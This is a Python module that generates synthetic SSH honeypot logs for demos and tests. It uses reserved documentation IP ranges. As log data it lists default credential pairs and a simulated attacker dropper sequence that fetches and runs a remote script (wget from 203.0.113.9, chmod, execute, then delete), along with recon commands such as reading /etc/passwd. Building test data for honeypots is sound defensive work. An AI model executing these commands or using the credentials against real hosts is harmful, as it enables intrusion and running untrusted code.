"""Synthetic honeypot logs for demos and tests (same schema as the real server)."""

from __future__ import annotations

import hashlib
import random
from datetime import datetime, timedelta, timezone

from .logs import JsonlLogger

START = datetime(2026, 10, 18, 0, 0, 0, tzinfo=timezone.utc)
# ranges present in data/geoip-sample.csv
IP_PREFIXES = {"XA": "192.0.2.", "XB": "198.51.100.", "XC": "203.0.113."}
CREDS = [
    ("root", "root"),
    ("root", "123456"),
    ("root", "password"),
    ("admin", "admin"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("root", "toor"),
    ("test", "test"),
    ("oracle", "oracle"),
    ("user", "user"),
]
CLIENTS = [
    ("SSH-2.0-libssh_0.9.6", "aes256-gcm@openssh.com"),
    ("SSH-2.0-Go", "chacha20-poly1305@openssh.com"),
    ("SSH-2.0-paramiko_3.4.0", "aes128-ctr"),
    ("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5", "chacha20-poly1305@openssh.com"),
]
DROPPER = [
    "uname -a",
    "cat /proc/cpuinfo",
    "cd /tmp",
    "wget http://203.0.113.9/x.sh",
    "chmod +x x.sh",
    "./x.sh",
    "rm -rf x.sh",
]
RECON = ["whoami", "id", "uname -m", "cat /etc/passwd", "ls /", "exit"]


def generate(path: str, seed: int = 1, sessions: int = 60) -> int:
    """Write a deterministic synthetic log. Returns the number of events."""
    rng = random.Random(seed)
    clock = {"t": START}
    log = JsonlLogger(
        path,
        max_bytes=1 << 40,
        clock=lambda: clock["t"].strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
    )
    count = 0

    def emit(event, sid, ip, port, **fields):
        nonlocal count
        log.log(event, session=sid, src_ip=ip, src_port=port, **fields)
        count += 1
        clock["t"] += timedelta(milliseconds=rng.randint(20, 900))

    for i in range(sessions):
        clock["t"] = START + timedelta(
            minutes=14 * i + rng.randint(0, 9), seconds=rng.randint(0, 59)
        )
        code = rng.choices(list(IP_PREFIXES), weights=[5, 3, 2])[0]
        ip = IP_PREFIXES[code] + str(rng.randint(2, 250))
        port = rng.randint(30000, 60000)
        sid = f"{rng.getrandbits(48):012x}"
        banner, cipher = rng.choice(CLIENTS)
        emit("connect", sid, ip, port)
        emit(
            "client",
            sid,
            ip,
            port,
            client_version=banner,
            cipher=cipher,
            mac=cipher,
            compression="none",
            client_id=hashlib.sha256(f"{banner}|{cipher}".encode()).hexdigest()[:16],
        )
        kind = rng.choices(
            ["stuffing", "dropper", "recon", "pubkey"], weights=[5, 3, 3, 1]
        )[0]
        attempts = rng.randint(1, 3) if kind == "stuffing" else rng.randint(1, 2)
        ok = False
        for n in range(1, attempts + 1):
            user, pw = rng.choice(CREDS)
            ok = kind in ("dropper", "recon") and n == attempts
            emit(
                "auth",
                sid,
                ip,
                port,
                method="password",
                username=user,
                password=pw,
                attempt=n,
                success=ok,
            )
        if kind == "pubkey":
            emit(
                "auth_pubkey",
                sid,
                ip,
                port,
                username="root",
                key_type="ssh-rsa",
                fingerprint="SHA256:" + "".join(rng.choices("abcdefghijklmnop", k=8)),
                success=False,
            )
        commands = DROPPER if kind == "dropper" else RECON if kind == "recon" else []
        if ok:
            emit("session_open", sid, ip, port, kind="shell", term="xterm")
        for line in commands if ok else []:
            urls = ["http://203.0.113.9/x.sh"] if "wget" in line else []
            emit(
                "command",
                sid,
                ip,
                port,
                kind="shell",
                input=line,
                status=0,
                cwd="/root",
                urls=urls,
                ips=["203.0.113.9"] if urls else [],
            )
        emit(
            "disconnect",
            sid,
            ip,
            port,
            duration=round(rng.uniform(0.5, 40), 2),
            attempts=attempts,
            commands=len(commands) if ok else 0,
            authenticated=ok,
            reason="closed",
        )
    log.close()
    return count
